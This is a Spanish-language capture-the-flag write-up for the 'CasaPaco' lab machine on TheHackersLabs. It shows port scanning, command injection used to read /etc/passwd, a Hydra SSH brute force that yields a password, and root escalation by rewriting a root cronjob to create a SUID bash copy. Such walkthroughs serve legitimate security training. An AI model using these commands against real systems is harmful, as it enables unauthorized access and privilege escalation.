# 🍽️ Resolución del CTF "Casa Paco" | The HackersLabs

**Plataforma:** TheHackersLabs  
**Nombre de la máquina:** CasaPaco  
**Dificultad:** Fácil/Media  
**Enfoque:** Inyección de comandos, fuerza bruta SSH, escalada de privilegios vía cronjob

---

## 🔍 1. Escaneo de puertos con Nmap

```bash
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 192.168.1.126 -oN escaneo.txt
```

<img width="821" height="481" alt="nmap" src="https://github.com/user-attachments/assets/aff6b0c2-466e-45a9-a334-66f9882348eb" />

**Puertos abiertos:**

- 22/tcp → OpenSSH 9.2p1
- 80/tcp → Apache 2.4.62

---

## 🌐 2. Enumeración web

Accedemos a `http://casapaco.thl/` y observamos una web de pedidos llamada **Casa Paco - Pedido para Llevar**.

Con **feroxbuster** descubrimos la existencia de un archivo interesante:

```bash
feroxbuster --url http://casapaco.thl --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

<img width="733" height="373" alt="feroxbuster" src="https://github.com/user-attachments/assets/49617581-df7b-4b75-b821-40184bd73676" />

Se encuentra el endpoint `llevar.php`.

---

## 💥 3. Inyección de comandos (Command Injection)

Probamos inyección en el Plato con el comando `dir`:

<img width="1127" height="412" alt="comando-dir" src="https://github.com/user-attachments/assets/3a51ce78-0993-4087-8f25-b35fdf9a00ba" />

Vemos que se repite el `llevar.php` y hay otro `llevar1.php`.

Intentamos leer `llevar.php`:

```bash
grep . llevar.php
```

<img width="1126" height="383" alt="grep-llevar php" src="https://github.com/user-attachments/assets/94c41778-1adc-4ff5-bcbe-cbf94d38c8ff" />

Vemos que permite sólo ciertos comandos.

Leemos `llevar1.php`:

<img width="1126" height="469" alt="grep-llevar1 php-norestricciones" src="https://github.com/user-attachments/assets/7ef5e868-82b1-469c-bf98-e457ed6d09fb" />

Detectamos que no tiene las restricciones de comandos que tiene `llevar.php`.

---

## 🕵️ 4. Enumeración de usuarios

Lanzamos con Burpsuite en `llevar1.php` el comando:

```bash
cat /etc/passwd
```

<img width="1131" height="523" alt="etc-passwd-llevar1 php" src="https://github.com/user-attachments/assets/4647750b-3ccf-4946-af14-d272b36d2240" />

Conseguimos leer `/etc/passwd` y encontramos un usuario llamado `pacogerente`

```
pacogerente:x:1001:1001::/home/pacogerente:/bin/bash
```

---

## 🔓 5. Ataque de fuerza bruta SSH

Usamos Hydra para romper la contraseña del usuario `pacogerente`:

```bash
hydra -l pacogerente -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.126
```

<img width="1044" height="113" alt="hydra-pacogerente" src="https://github.com/user-attachments/assets/1c8be1ec-428e-43c1-b44d-44d6552fde78" />

**Credenciales válidas:**
- Usuario: pacogerente
- Contraseña: dipset1

---

## 💻 6. Acceso SSH

```bash
ssh pacogerente@192.168.1.126
```

<img width="535" height="207" alt="ssh-pacogerente" src="https://github.com/user-attachments/assets/5098e4f4-bc61-458e-ae5f-06d3cd333f62" />

Entramos correctamente y confirmamos el usuario con `whoami`.

---

## 🎯 7. Obtención de la flag de usuario

```bash
cat /home/pacogerente/user.txt
```

<img width="418" height="173" alt="flag-user" src="https://github.com/user-attachments/assets/e2043333-d3d9-4a3c-9aba-203cfffb62e9" />

Flag de usuario obtenida exitosamente.

---

## ⬆️ 8. Escalada de privilegios vía cronjob

Listamos los cronjobs del sistema:

```bash
ls -l /etc/cron.d/
```

Encontramos un cronjob ejecutado como **root** cada minuto:

```bash
* * * * * root /home/pacogerente/fabada.sh
```

<img width="668" height="233" alt="vuln_cron" src="https://github.com/user-attachments/assets/c8890e74-2d33-46e8-8b06-c0bcdb961cb8" />

### 🔧 Script original

```bash
#!/bin/bash
echo "Ejecutado por cron el: $(date)" >> /home/pacogerente/log.txt
```

<img width="340" height="49" alt="cat-fabada sh" src="https://github.com/user-attachments/assets/0b5d1661-be25-426d-93e2-ddc83cf9fc49" />

### 🔥 Lo modificamos para escalar privilegios:

```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

<img width="267" height="40" alt="revshell-fabada sh" src="https://github.com/user-attachments/assets/e3c264ce-f38f-4c7b-bc57-375a583a1867" />

Tras esperar la ejecución automática del cron, se crea el binario `/tmp/rootbash` con bit SUID:

```bash
ls -l /tmp/rootbash
-rwsr-sr-x 1 root root [...] /tmp/rootbash
```

Ejecutamos con privilegios:

```bash
/tmp/rootbash -p
whoami
> root
```

<img width="298" height="48" alt="escalada-root" src="https://github.com/user-attachments/assets/1eac16cd-cb2e-46f1-b320-29eb7bbab191" />

---

## 🏁 9. Flag root

```bash
cat /root/root.txt
```

<img width="167" height="20" alt="flag-root" src="https://github.com/user-attachments/assets/72196122-7d0b-4b47-b592-6bd008c98892" />

Flag de root obtenida con éxito ✅

---

## 🧩 Conclusión

Resumen de pasos:

1. Enumeración web e identificación de endpoint vulnerable (`llevar.php`)
2. Explotación de inyección de comandos
3. Enumeración de usuarios desde `/etc/passwd`
4. Ataque de fuerza bruta por SSH
5. Escalada de privilegios mediante cronjob mal configurado
6. Modificación del script para generar binario con bit SUID
7. Ejecución como root y obtención de la flag final

---
